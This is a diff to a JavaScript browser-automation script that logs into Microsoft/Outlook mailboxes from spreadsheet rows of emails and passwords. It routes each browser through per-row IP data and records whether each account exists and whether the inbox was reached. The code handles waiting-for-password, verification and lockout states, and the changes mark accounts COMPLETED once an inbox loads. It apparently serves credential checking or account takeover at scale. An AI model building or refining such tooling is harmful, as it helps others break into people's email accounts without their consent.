@@ -303,6 +303,16 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
         logger.debug(`[checkAccountAccess][${instanceId}] Starting flow for ${platform}.`);
         speed('flow start');
 
+        // FIX: If reusing a session that already reached the inbox, detect it immediately
+        // and return success — don't re-enter email / navigate to login page.
+        if (isReusingSession) {
+            const alreadyAtInbox = await isInbox(page, platformConfig).catch(() => false);
+            if (alreadyAtInbox) {
+                logger.info(`[checkAccountAccess][${instanceId}] Session reuse: already at inbox (${page.url()}). Returning success.`);
+                return { emailExists: true, accountAccess: true, reachedInbox: true, requiresVerification: false, verificationState: 'COMPLETED' };
+            }
+        }
+
         // Special handling for email retry in reusing session
         if (isReusingSession && platformConfig.selectors?.input) {
             logger.info(`[checkAccountAccess][${instanceId}] Reusing session for email retry, typing email directly. URL: ${page.url()}`);
@@ -372,6 +382,13 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     }
 
                     if (!inputFound) {
+                    // FIX: Don't navigate away if we're already at the inbox — the email
+                    // input may not be visible because the inbox loaded successfully.
+                    const stillAtInbox = await isInbox(page, platformConfig).catch(() => false);
+                    if (stillAtInbox) {
+                        logger.info(`[checkAccountAccess][${instanceId}] At inbox but email input not found — inbox already reached. Returning success.`);
+                        return { emailExists: true, accountAccess: true, reachedInbox: true, requiresVerification: false, verificationState: 'COMPLETED' };
+                    }
                     await page.goto(platformConfig.url, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(navErr => {
                         logger.warn(`[checkAccountAccess][${instanceId}] goto to login page failed/timeout (${navErr.message}). Polling for input anyway...`);
                     });
@@ -2045,6 +2062,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     let status = sheetStatus;
     let email = row[columnIndexes['email']]; // Changed to let
     let password = row[columnIndexes['password']];
+    const ipDataRaw = row[columnIndexes['ipData']];
+    const ipData = ipDataRaw ? (typeof ipDataRaw === 'string' ? (() => { try { return JSON.parse(ipDataRaw); } catch { return null; } })() : ipDataRaw) : null;
     // Terminal account-lockout gate: if Microsoft's lockout/block screen is present, the
     // process MUST fail immediately — never loop back to a waiting state. Checks the page
     // and, on match, persists FAILED + notifies, then returns true (caller exits).
@@ -2334,7 +2353,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     logger.info(`[processRow][${browserId}] Attempt ${i + 1}/${maxLaunchRetries} to launch browser.`);
                     browser = await launchBrowser({
                         userDataDir,
-                        headless: isDev ? false : "new"
+                        headless: isDev ? false : "new",
+                        ipData
                     });
                     logger.info(`[processRow][${browserId}] Browser launched successfully on attempt ${i + 1}. PID: ${browser.process()?.pid}`);
                     globalThis.__profileWriter = globalThis.__profileWriter || new Map();
@@ -3072,6 +3092,22 @@ if (!foundSelector) {
                                          // usually still rendering, so keep polling instead.
                                          const onMicrosoftLoginHost = currentUrl.includes('login.live.com') || currentUrl.includes('login.microsoftonline.com');
                                          if (currentUrl === 'about:blank' || !onMicrosoftLoginHost) {
+                                             // FIX: Don't navigate away if we're already at the inbox — the
+                                             // password entry is unnecessary and would restart the entire login flow.
+                                             const inboxDuringPw = await isInbox(page, platformConfig).catch(() => false);
+                                             if (inboxDuringPw) {
+                                                 logger.info(`[processRow][${browserId}] Already at inbox during WAITINGPASSWORD (${currentUrl}). Marking COMPLETED.`);
+                                                 finalStatus = "COMPLETED";
+                                                 updateData.status = "COMPLETED";
+                                                 updateData.lastJsonResponse = JSON.stringify({
+                                                     status: "COMPLETED",
+                                                     message: "Login successful.",
+                                                     email: email,
+                                                     platform: platform
+                                                 });
+                                                 passwordProvidedAndProcessed = true;
+                                                 break;
+                                             }
                                              logger.info(`[processRow][${browserId}] Page is at ${currentUrl}, navigating to login page for password entry.`);
                                              await page.goto(platformConfig.url || 'https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e => {
                                                  logger.warn(`[processRow][${browserId}] Navigation to login page failed: ${e.message}`);
